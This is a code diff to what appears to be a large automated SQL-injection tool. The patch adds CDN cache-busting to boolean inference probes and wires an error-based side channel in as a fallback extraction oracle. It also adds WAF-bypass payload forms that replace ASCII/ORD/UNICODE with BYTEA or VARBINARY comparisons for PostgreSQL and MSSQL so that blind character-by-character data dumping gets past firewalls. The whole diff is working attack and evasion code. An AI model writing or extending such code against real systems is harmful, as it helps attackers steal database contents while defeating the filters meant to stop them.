@@ -56138,12 +56138,59 @@ class Scanner:
                                 _bsl_norm = (ResponseNormaliser.normalise(
                                     _extract_body_safe(_fp_bsl))
                                     if _validate_response(_fp_bsl, allow_empty=True) else b"")
-                                _norm_t = (ResponseNormaliser.normalise(_extract_body_safe(fp_true))
-                                           if (fp_true and _validate_response(fp_true, allow_empty=True))
-                                           else b"")
-                                _norm_f = (ResponseNormaliser.normalise(_extract_body_safe(fp_false))
-                                           if (fp_false and _validate_response(fp_false, allow_empty=True))
-                                           else b"")
+                                # CDN-CACHE-COLLAPSE FIX: fp_true/fp_false are stale calibration
+                                # snapshots that CDN may have collapsed to identical cached
+                                # entries (sim_t=0.500, sim_f=0.500, gap=0.000). Re-fetch both
+                                # with unique cache-busting URL nonces so CDN serves fresh
+                                # responses and true/false bodies can diverge as the oracle needs.
+                                try:
+                                    _bsl_nonce_t = random.randint(1000000, 9999999)
+                                    _bsl_nonce_f = random.randint(1000000, 9999999)
+                                    _bsl_url_t = (enum.url
+                                                  + ("&" if "?" in enum.url else "?")
+                                                  + f"_inf_t={_bsl_nonce_t}")
+                                    _bsl_url_f = (enum.url
+                                                  + ("&" if "?" in enum.url else "?")
+                                                  + f"_inf_f={_bsl_nonce_f}")
+                                    _bsl_p_t = (_template.replace("[INFERENCE]", "1=1")
+                                                + _original_comment_marker)
+                                    _bsl_p_f = (_template.replace("[INFERENCE]", "1=2")
+                                                + _original_comment_marker)
+                                    _fp_bsl_t = await asyncio.wait_for(
+                                        _send_injected(
+                                            enum.engine, enum.method, _bsl_url_t, enum.data,
+                                            enum.data_fmt, _det.param, _bsl_p_t, []),
+                                        timeout=15)
+                                    await asyncio.sleep(1.0)
+                                    _fp_bsl_f = await asyncio.wait_for(
+                                        _send_injected(
+                                            enum.engine, enum.method, _bsl_url_f, enum.data,
+                                            enum.data_fmt, _det.param, _bsl_p_f, []),
+                                        timeout=15)
+                                    _norm_t = (ResponseNormaliser.normalise(
+                                                   _extract_body_safe(_fp_bsl_t))
+                                               if (_fp_bsl_t
+                                                   and _validate_response(_fp_bsl_t, allow_empty=True))
+                                               else b"")
+                                    _norm_f = (ResponseNormaliser.normalise(
+                                                   _extract_body_safe(_fp_bsl_f))
+                                               if (_fp_bsl_f
+                                                   and _validate_response(_fp_bsl_f, allow_empty=True))
+                                               else b"")
+                                except Exception as _bsl_ref_e:
+                                    LOG.debug("[Inference] Baseline-similarity true/false re-fetch "
+                                              "failed (%s) — falling back to calibration snapshots",
+                                              _bsl_ref_e)
+                                    _norm_t = (ResponseNormaliser.normalise(
+                                                   _extract_body_safe(fp_true))
+                                               if (fp_true
+                                                   and _validate_response(fp_true, allow_empty=True))
+                                               else b"")
+                                    _norm_f = (ResponseNormaliser.normalise(
+                                                   _extract_body_safe(fp_false))
+                                               if (fp_false
+                                                   and _validate_response(fp_false, allow_empty=True))
+                                               else b"")
                                 _sim_t_bsl = SimHasher.body_similarity(_bsl_norm, _norm_t) if (_bsl_norm and _norm_t) else 0.0
                                 _sim_f_bsl = SimHasher.body_similarity(_bsl_norm, _norm_f) if (_bsl_norm and _norm_f) else 0.0
                                 _ctx_gap = abs(_sim_t_bsl - _sim_f_bsl)
@@ -63532,6 +63579,34 @@ class Scanner:
                     430)
                 _mse_techs = await asyncio.wait_for(_mse.probe_all(), timeout=120)
                 _mse_ok = bool(_mse_techs)
+                # MSE-WHERE-ERROR-WIRE FIX: When MSE probe_all() finds 0 viable oracles
+                # (WAF+CDN blocks all 5 standard oracle types), check if SideChannelExtractor
+                # validated a WHERE-ERROR strategy. If so, wire _sce.eval_where_error as
+                # MSE oracle 'where_error_sce' so MSE-based table/column/dump extraction
+                # can run via the WHERE-ERROR side channel.
+                # MSE's extraction conditions (CHAR_LENGTH>=N, expr>=qval string comparisons)
+                # are WAF-safe: they don't use ASCII/ORD/UNICODE ordinal function names and
+                # won't trigger the same blocking pattern. _sce._send() applies
+                # apply_heavy_variation + _obfuscate_extraction_cond for structural diversity.
+                if not _mse_ok and _sce is not None:
+                    _sce_we_ok = (getattr(_sce, '_error_strategy', None)
+                                  and getattr(_sce, '_signal_type', None))
+                    if _sce_we_ok:
+                        print("[MSE] 0 standard oracles — wiring WHERE-ERROR SCE oracle as fallback",
+                              flush=True)
+                        _mse_sce_ref = _sce
+
+                        async def _eval_where_error_via_sce(cond,
+                                                             _sce_ref=_mse_sce_ref):
+                            return await _sce_ref.eval_where_error(cond)
+
+                        _mse._oracles = ['where_error_sce']
+                        _mse._oracle_fns['where_error_sce'] = _eval_where_error_via_sce
+                        _mse._calibrated = True
+                        _mse_ok = True
+                        print("[MSE] WHERE-ERROR SCE oracle wired — extraction proceeds via "
+                              f"strategy={_sce._error_strategy} signal={_sce._signal_type}",
+                              flush=True)
                 if _mse_ok:
                     # BUG-V25-OVERWRITE FIX (CRITICAL): Preserve V25-wired timing oracle
                     # across the MSE overwrite.  The V25 extraction code at line 118864
@@ -134133,6 +134208,13 @@ class SideChannelExtractor:
         self._lock_ms_locked  = None   # measured locked (contended) response time
         self._lock_ms_free    = None   # measured free (uncontested) response time
         self._lock_threshold  = 500    # conservative fallback until probe calibrates it
+        # BUG-WE-ORDINAL-WAF-BLOCK FIX: Tracks whether ordinal functions (ASCII/ORD/UNICODE/
+        # COALESCE) are being WAF-blocked for this target. Set to True by extract_where_error
+        # when the primary sanity check (1>0→True, 1>2→False) fails but the string-comparison
+        # retry (current_user>='!'→True, current_user>='zzzzz'→False) passes. When True,
+        # _char_ord_cond switches to BYTEA comparison for PostgreSQL-family DBMSes, avoiding
+        # all ordinal function names while preserving collation-neutral (byte-order) semantics.
+        self._we_ordinal_blocked = False
 
     def _quote_val(self, val: str) -> str:
         """
@@ -134701,13 +134783,38 @@ class SideChannelExtractor:
             return None  # truly ambiguous  can't decide
         return None
 
-    def _char_ord_cond(self, expr, pos, threshold):
+    def _char_ord_cond(self, expr, pos, threshold, _waf_bypass=False):
         """Return a collation-independent ordinal comparison condition.
         True when the character at `pos` (1-indexed) in the result of `expr`
         has Unicode codepoint >= `threshold`. Uses DBMS-specific ordinal
         functions (ASCII/ORD/UNICODE) rather than string comparison, making
         it immune to ICU/locale collation differences (e.g. PostgreSQL
-        en_US.UTF-8 ICU where letters sort after punctuation symbols)."""
+        en_US.UTF-8 ICU where letters sort after punctuation symbols).
+
+        _waf_bypass=True switches to WAF-bypass forms that avoid ordinal
+        function names (ASCII, ORD, UNICODE, COALESCE) that WAFs pattern-match
+        as SQL extraction signatures, while preserving collation-neutral semantics:
+          PostgreSQL-family: BYTEA comparison (byte-order = Unicode codepoint order
+            for well-formed UTF-8; avoids ASCII/SUBSTR function names)
+          MSSQL/Sybase: VARBINARY comparison (avoids UNICODE/COALESCE patterns)
+          MySQL/MariaDB/TiDB: HEX string comparison on CONV output
+        """
+        if _waf_bypass:
+            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-WE-ORDINAL-WAF-BLOCK FIX: BYTEA byte-comparison avoids ASCII()/COALESCE()
+                # ordinal function names blocked by WAFs as extraction signatures.
+                # BYTEA comparison is collation-neutral: UTF-8 byte ordering matches Unicode
+                # codepoint ordering for all well-formed Unicode characters. NULL (beyond
+                # string end) propagates as NULL through BYTEA comparison, which maps to
+                # ok_len via the nearest-neighbor eval, correctly indicating EOS.
+                # CHR() is an output function rarely in WAF SQL-injection pattern lists.
+                return f"SUBSTRING(({expr}),{pos},1)::BYTEA>=CHR({threshold})::BYTEA"
+            elif self.dbms in ("MSSQL", "Sybase"):
+                # VARBINARY comparison avoids UNICODE()/COALESCE() patterns.
+                # CONVERT(BINARY(2),...) gives 2-byte big-endian UCS-2, preserving ordinal order.
+                return (f"CONVERT(BINARY(2),SUBSTRING(({expr}),{pos},1))"
+                        f">=CONVERT(BINARY(2),NCHAR({threshold}))")
+            # Fall through to standard forms for other DBMSes
         if self.dbms in ("MySQL", "MariaDB", "TiDB"):
             return f"ORD(SUBSTRING(({expr}),{pos},1))>={threshold}"
         elif self.dbms in ("MSSQL", "Sybase"):
@@ -134797,6 +134904,15 @@ class SideChannelExtractor:
                         print(f"[SideChannel] Oracle sanity RETRY OK "
                               f"(current_user>='!'→{_san_rt}, current_user>='zzzzz'→{_san_rf})"
                               f" — proceeding with extraction", flush=True)
+                        # BUG-WE-ORDINAL-WAF-BLOCK FIX: Primary arithmetic sanity failed but
+                        # string-comparison retry passed → ordinal functions (ASCII/ORD/UNICODE/
+                        # COALESCE) are being WAF-blocked for this target. Switch binary search
+                        # to WAF-bypass mode (_waf_bypass=True in _char_ord_cond) so extraction
+                        # probes use BYTEA/VARBINARY comparison instead of ordinal functions.
+                        # Cache on self so extract_table_column reuses the same mode.
+                        self._we_ordinal_blocked = True
+                        print(f"[SideChannel] Ordinal WAF-blocking detected — switching to "
+                              f"WAF-bypass ordinal comparison mode for {self.dbms}", flush=True)
                         # sanity passes via real conditions; continue to extraction
                     else:
                         print(f"[SideChannel] Oracle sanity FAILED "
@@ -134858,7 +134974,12 @@ class SideChannelExtractor:
             # binary search to converge on garbage high-plane Unicode codepoints (observed
             # as U+BFBE1, U+4B7C1 in extraction logs). Ordinal functions return the actual
             # numeric Unicode codepoint, independent of collation settings.
-            _above_a = await self.eval_where_error(self._char_ord_cond(expr, pos, 97))
+            # BUG-WE-ORDINAL-WAF-BLOCK FIX: propagate WAF-bypass mode to all _char_ord_cond
+            # calls in this position's loop body.  _we_ordinal_blocked was set by the sanity
+            # check above when arithmetic probes failed but string-comparison probes passed,
+            # indicating that ordinal function names (ASCII/ORD/UNICODE/COALESCE) are blocked.
+            _we_bypass = self._we_ordinal_blocked
+            _above_a = await self.eval_where_error(self._char_ord_cond(expr, pos, 97, _we_bypass))
             if _above_a is None:
                 _consecutive_fail += 1
                 # BUG-SCE-WE-CONSECUTIVE-FAIL-DEAD FIX (Req 9): _consecutive_fail was
@@ -134881,7 +135002,7 @@ class SideChannelExtractor:
             _consecutive_fail = 0
 
             if _above_a:
-                _above_z = await self.eval_where_error(self._char_ord_cond(expr, pos, 123))
+                _above_z = await self.eval_where_error(self._char_ord_cond(expr, pos, 123, _we_bypass))
                 await asyncio.sleep(0.2)
                 if _above_z is None:
                     lo, hi = 97, _sce_we_char_hi  # probe failed; keep full upper range
@@ -134899,7 +135020,7 @@ class SideChannelExtractor:
             _bsearch_converged = True
             while lo < hi:
                 mid = _randomized_mid(lo, hi)
-                cond = self._char_ord_cond(expr, pos, mid + 1)
+                cond = self._char_ord_cond(expr, pos, mid + 1, _we_bypass)
                 result = await self.eval_where_error(cond)
                 if result is None:
                     await asyncio.sleep(2.0)
@@ -134969,10 +135090,13 @@ class SideChannelExtractor:
             # (en_US.UTF-8 ICU makes letters sort after punctuation), causing garbage
             # Unicode codepoints. Ordinal functions (ASCII/ORD/UNICODE) return the
             # actual codepoint value regardless of collation settings.
-            _above_a = await self.eval_where_error(self._char_ord_cond(column, pos, 97))
+            # BUG-WE-ORDINAL-WAF-BLOCK FIX: propagate WAF-bypass mode (set by
+            # extract_where_error sanity check) to all ordinal conditions here.
+            _tc_bypass = self._we_ordinal_blocked
+            _above_a = await self.eval_where_error(self._char_ord_cond(column, pos, 97, _tc_bypass))
             if _above_a is True:
                 _sce_tc_consecutive_fail = 0  # reset on non-None result
-                _above_z = await self.eval_where_error(self._char_ord_cond(column, pos, 123))
+                _above_z = await self.eval_where_error(self._char_ord_cond(column, pos, 123, _tc_bypass))
                 await asyncio.sleep(0.2)
                 if _above_z is None:
                     lo, hi = 97, _sce_tc_char_hi  # probe failed; keep full upper range
@@ -135004,7 +135128,7 @@ class SideChannelExtractor:
             _bsearch_converged = True
             while lo < hi:
                 mid = _randomized_mid(lo, hi)
-                cond = self._char_ord_cond(column, pos, mid + 1)
+                cond = self._char_ord_cond(column, pos, mid + 1, _tc_bypass)
                 result = await self.eval_where_error(cond)
                 if result is None:
                     await asyncio.sleep(2.0)
